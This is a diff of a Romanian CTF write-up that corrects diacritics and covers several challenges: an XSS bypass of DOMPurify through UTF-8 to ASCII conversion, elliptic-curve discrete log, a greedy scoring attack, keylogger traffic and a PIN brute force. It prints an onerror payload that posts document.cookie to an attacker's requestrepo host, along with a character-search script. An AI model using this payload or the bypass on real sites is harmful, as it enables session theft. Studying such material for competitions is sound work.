-* Exista o functie numita `spawnBot` care porneste un proces de tip `puppeteer`, practic o instanta de browser, Google Chrome in acest caz, care poate fi controlata prin cod. Flag-ul se afla in cookie, deci stim ca avem de-a face cu o problema de tip *XSS*
-* Avem 3 rute la dispozitie: 
-    * `GET pe /api/v1/note` cu input-ul `?id=` in query string
-    * `POST pe /api/v1/note` cu input-ul `{"content":"text pe care il controlam"}` in body, si content-type application/json
-    * `GET pe /api/v1/note` cu input-ul `?id=`, pentru a trimite acel id catre admin, pentru a verifica continutul. Observam ca admin-ul se va conecta pe `/note/<note_id>`, in loc de `/api/v1/note`
+Observăm câteva lucruri interesante:
+* Există o funcție numită `spawnBot` care pornește un proces de tip `puppeteer`, practic o instanță de browser, Google Chrome în acest caz, care poate fi controlată prin cod. Flag-ul se află în cookie, deci știm că avem de-a face cu o problemă de tip *XSS*.
+* Avem 3 rute la dispoziție:
+    * `GET pe /api/v1/note` cu input-ul `?id=` în query string.
+    * `POST pe /api/v1/note` cu input-ul `{"content":"text pe care îl controlăm"}` în body, și content-type application/json.
+    * `GET pe /api/v1/note` cu input-ul `?id=`, pentru a trimite acel id către admin, pentru a verifica conținutul. Observăm că admin-ul se va conecta pe `/note/<note_id>`, în loc de `/api/v1/note`.
 
-Cum am stiut exact ce input putem aplica rutelor? Ei bine am mentionat `schema.ts`, in acest caz avem `GetNote` si `PostNote` cu urmatoarele definitii:
+Cum am știut exact ce input putem aplica rutelor? Ei bine, am menționat `schema.ts`, în acest caz avem `GetNote` și `PostNote` cu următoarele definiții:
 ```ts
 import { z } from 'zod'
 
@@ -678,17 +677,17 @@ export const GetNote = z.object({
 })
 ```
 
-Unde `zod` este folosit pentru validare. Pentru request-urile GET, parametrii de obicei se trimit in **query string**. Iar pentru POST, de obicei in **body**, dar pot fi trimisi si in **query string** uneori, depinde de server.
+Unde `zod` este folosit pentru validare. Pentru request-urile GET, parametrii de obicei se trimit în **query string**. Iar pentru POST, de obicei în **body**, dar pot fi trimiși și în **query string** uneori, depinde de server.
 
-Dar cum arata aceste note? Daca urmarim `src/index.ts`:
+Dar cum arată aceste note? Dacă urmărim `src/index.ts`:
 ```ts
 app.get('/note/:id', (_, res) => {
   res.sendFile(path.join(process.cwd(), 'static/note.html'))
 })
 ```
-Unde id-ul notei este preluat direct din path (acesta este un alt mod in care se poate trimite informatie prin request-uri HTTP).
+Unde id-ul notei este preluat direct din path (acesta este un alt mod în care se poate trimite informație prin request-uri HTTP).
 
-Okay, stim ca vrem sa obtinem XSS, asa ca ne uitam in `note.html`:
+Okay, știm că vrem să obținem XSS, așa că ne uităm în `note.html`:
 ```html
   <script>
     window.addEventListener('load', () => {
@@ -723,56 +722,75 @@ Okay, stim ca vrem sa obtinem XSS, asa ca ne uitam in `note.html`:
   </script>
 ```
 
-Nu este foarte mult cod. Avem un buton pentru a raporta nota, si un `fetch` facut atunci cand codul html s-a incarcat. Importanta este aceasta linie:
+Nu este foarte mult cod. Avem un buton pentru a raporta nota, și un `fetch` făcut atunci când codul HTML s-a încărcat. Importantă este această linie:
 ```js
 node.innerHTML = result.content
 ```
-Continutul notei o sa fie introdus direct ca html in pagina. Deci daca avem o nota cu continut html de genul: 
+Conținutul notei o să fie introdus direct ca HTML în pagină. Deci, dacă avem o notă cu conținut HTML de genul: 
 ```
 <img src=x onerror=fetch("//attacker.requestrepo.com/",{method:"POST",body:document.cookie})/>
 ```
-putem obtine executie de cod in JavaScript. Deoarece resursa `x` nu exista, se va apela handler-ul `onerror`, care va *exfiltra* flag-ul catre requestrepo (sau alt server la care avem acces la log-uri).
+putem obține execuție de cod în JavaScript. Deoarece resursa `x` nu există, se va apela handler-ul `onerror`, care va *exfiltra* flag-ul către requestrepo (sau alt server la care avem acces la loguri).
 
-De ce nu putem introduce direct acest payload in continutul notei? Ei bine, cand nota este salvata pe server, se aplica functia de sanitizare de la DOMPurify:
+De ce nu putem introduce direct acest payload în conținutul notei? Ei bine, când nota este salvată pe server, se aplică funcția de sanitizare de la DOMPurify:
 ```
 noteMap[uuid] = Buffer.from(DOMPurify.sanitize(req.content))
 ```
 
-DOMPurify este o biblioteca folosita de milioane de site-uri, deci nu trebuie sa pierdem timpul incercand sa gasim un bypass.
+DOMPurify este o bibliotecă folosită de milioane de site-uri, deci nu trebuie să pierdem timpul încercând să găsim un bypass.
 
-Solutia este subtila, dar se afla in aceasta linie de cod:
+Soluția este subtilă, dar se află în această linie de cod:
 ```js
 .send({ id: req.id, content: noteMap[req.id].toString('ascii') })
 ```
 
-De ce? Sau cum de am stiut ca trebuie sa fie acolo? 
+De ce? Sau cum de am știut că trebuie să fie acolo?
 
-Doar am aplicat un proces de eliminare
-* Stim ca trebuie sa obtinem XSS pentru a obtine flag-ul
-* Notele sunt salvate in mod sigur
-* Atunci vulnerabilitatea trebuie sa fie in modul in care este afisata nota
+Doar am aplicat un proces de eliminare:
+* Știm că trebuie să obținem XSS pentru a obține flag-ul.
+* Notele sunt salvate în mod sigur.
+* Atunci vulnerabilitatea trebuie să fie în modul în care este afișată nota.
 
-Si ce legatura are `.toString('ascii')`? Aici trebuie sa vorbim despre modul in care sunt codificate caractere. Ascii reprezinta codificarea pe 8 biti sau 1 octet. Asta inseamna ca putem avea maxim 2^8 = 256 de caractere diferite. 
+Și ce legătură are `.toString('ascii')`? Aici trebuie să vorbim despre modul în care sunt codificate caracterele. Ascii reprezintă codificarea pe 8 biți sau 1 octet. Asta înseamnă că putem avea maxim 2^8 = 256 de caractere diferite.
 
-Daca ne gandim la cate caractere in alte limbi exista, emoji-uri si asa mai departe, este clar ca acest mod nu poate fi folosit pentru a reprezenta exact acest tip de continut.
+Dacă ne gândim la câte caractere în alte limbi există, emoji-uri și așa mai departe, este clar că acest mod nu poate fi folosit pentru a reprezenta exact acest tip de conținut.
 
-Dar, atunci cand salvam o nota, noi nu o salvam in codificarea ASCII. Daca ne uitam in documentatia node, putem gasi aceasta fraza:
+Dar, atunci când salvăm o notă, noi nu o salvăm în codificarea ASCII. Dacă ne uităm în documentația Node, putem găsi această frază:
 ```
 Node's default encoding for strings is UTF-8
 ```
 
-[Wikipedia explica destul de bine codificarea UTF-8](https://en.wikipedia.org/wiki/UTF-8), dar pe scurt, aceasta codificare ne ajuta sa reprezentam mult mai multe caractere.
+[Wikipedia explică destul de bine codificarea UTF-8](https://en.wikipedia.org/wiki/UTF-8), dar pe scurt, această codificare ne ajută să reprezentăm mult mai multe caractere.
 
-De exemplu, emoji-ul 🚩 este reprezentat in UTF-8 prin secventa de octeti `f0 9f 9a a9`. Cum arata totusi aceasta secventa daca o trecem prin functiile `Buffer.from('🚩').toString('ascii')`?
+De exemplu, emoji-ul 🚩 este reprezentat în UTF-8 prin secvența de octeți `f0 9f 9a a9`. Cum arată totuși această secvență dacă o trecem prin funcțiile `Buffer.from('🚩').toString('ascii')`?
 
-Ei bine, arata asa: `p\x1F\x1A)`, unde putem observa caracterele printabile 'p' si ')', '\x1F' so '\x1A' fiind caractere neprintabile, conform ![](https://media.geeksforgeeks.org/wp-content/uploads/20240304094301/ASCII-Table.png)
+Ei bine, arată așa: `p\x1F\x1A)`, unde putem observa caracterele printabile 'p' și ')', '\x1F' și '\x1A' fiind caractere neprintabile, conform ![](https://media.geeksforgeeks.org/wp-content/uploads/20240304094301/ASCII-Table.png).
 
-Un lucru important de stiut este ca DOMPurify opereaza pe string-uri UTF-8. Deci chiar daca poate depista un XSS in UTF-8, acest lucru nu este valabil si pentru o conversie UTF-8 -> sanitizare -> ascii. Deoarece DOMPurify are grija sa nu strice caracterele UTF-8 valide, pana la urma cum ar fi daca am avea 🚩 intr-o nota pe bune, si nu am putea vedea emoji-ul dupa ce salvam? :)
+Un lucru important de știut este că DOMPurify operează pe string-uri UTF-8. Deci, chiar dacă poate depista un XSS în UTF-8, acest lucru nu este valabil și pentru o conversie UTF-8 -> sanitizare -> ascii. Deoarece DOMPurify are grijă să nu strice caracterele UTF-8 valide, până la urmă cum ar fi dacă am avea 🚩 într-o notă pe bune și nu am putea vedea emoji-ul după ce salvăm? :)
 
+Tot ce avem de făcut pentru a avea un payload valid este să găsim ce caracter UTF-8 atunci când este transformat în ASCII, produce caracterele `<` și `>`:
 
+```js
+let dompurify = require("isomorphic-dompurify");
 
+for (let i = 0; i <= 65535; i++)
+  {
+    let data = Buffer.from(String.fromCharCode(i)).toString('ascii');
+    // test if < or > is present in the output
+    if (data.endsWith('<'))
+    {
+      console.log('<', i, data);
+    }
+    if (data.endsWith('>'))
+    {
+      console.log('>', i, data);
+    }
+  }
 
-Raportam note-ul catre admin, si primim flag-ul pe requestrepo:
+console.log(dompurify.sanitize('\ufd3c'));
+```
+
+Raportăm nota către admin și primim flag-ul pe requestrepo:
 
 **CTF{1edcb4125573c79a8b1b651c47be24e62da2421ba6c357be90b321857412174c}**
 
@@ -798,7 +816,7 @@ x = 1  # Find x
 # Q = (1249902752727911034264929949680: 3043929197938243211289309561776: 1)
 ```
 
-Mai este cunoscuta si ca problema logaritmului discret. Doar ca avem de-a face cu curbe eliptice. Conform Wikipedia: O curbă eliptică este definită peste un corp K și descrie punctele din K^2, produsul cartezian al lui K cu el însuși.
+Mai este cunoscută și ca problema logaritmului discret. Doar că avem de-a face cu curbe eliptice. Conform Wikipedia: O curbă eliptică este definită peste un corp K și descrie punctele din K^2, produsul cartezian al lui K cu el însuși.
 
 Putem folosi SageMath pentru a rezolva problema pentru noi:
 
@@ -820,7 +838,7 @@ x = P.discrete_log(Q)
 print(x)
 ```
 
-Si gasim ca `x=588581747331`. 
+Și găsim că `x=588581747331`.
 
 **flag{b2a3253556aeb3bb0f1782c083e90b6de968688d3f435863b82597e6f5efe4c0}**
 
@@ -950,7 +968,7 @@ Dacă ești interesat să îți povestesc mai multe, obține secretul din fișie
 Target: http://142.93.100.92:19417/
 ```
 
-O solutie prin care optimizam procentul de `leet` intr-un mod greedy (la fiecare iteratie, luam caracterul care ne-a dat cel mai bun scor:`
+O soluție prin care optimizăm procentul de `leet` într-un mod greedy (la fiecare iterație, luăm caracterul care ne-a dat cel mai bun scor):
 
 ```py
 import requests
@@ -991,7 +1009,7 @@ for i in range(2, 20):
 <a name="jeopardy-rocsc"></a>
 # Jeopardy ROCSC
 
-Niste probleme putin mai grele date doar concurentilor care au participat la ROCSC.
+Niște probleme puțin mai grele date doar concurenților care au participat la ROCSC.
 
 <a name="keylogger"></a>
 ## keylogger (433 pts, 7 solves) - Network
@@ -1003,7 +1021,7 @@ Analizează fișierul primit și obține secretul.
 Flag format: CTF{sha256}
 ```
 
-Problema a fost foarte similara cu aceasta: [https://klanec.github.io/rgbctf/2020/07/19/rgbctf-PI-1.html](https://klanec.github.io/rgbctf/2020/07/19/rgbctf-PI-1.html)
+Problema a fost foarte similară cu aceasta: [https://klanec.github.io/rgbctf/2020/07/19/rgbctf-PI-1.html](https://klanec.github.io/rgbctf/2020/07/19/rgbctf-PI-1.html)
 
 Script de rezolvare:
 ```py
@@ -1217,7 +1235,8 @@ Tocmai ce ai primit câteva date encriptate și cheile necesare pentru a le decr
 Flag format: CTF{sha256}
 ```
 
-Primim continutul unui `token digital`, folosit pentru semnaturi electronice. 
+Primim conținutul unui `token digital`, folosit pentru semnături electronice.
+
 ```py
 import os
 import subprocess
@@ -1260,7 +1279,7 @@ if not found_pin:
 print(found_pin)(base)
 ```
 
-Si aflam PIN-ul 12345. Il putem folosi pentru a decripta continutul fisierului si a obtine flag-ul:
+Și aflăm PIN-ul 12345. Îl putem folosi pentru a decripta conținutul fișierului și a obține flag-ul:
 
 **CTF{4E669FC71463B0C0C13488E4B8627267399E581C4A2AD2D19FFEC44A65AAB8B0}**
 
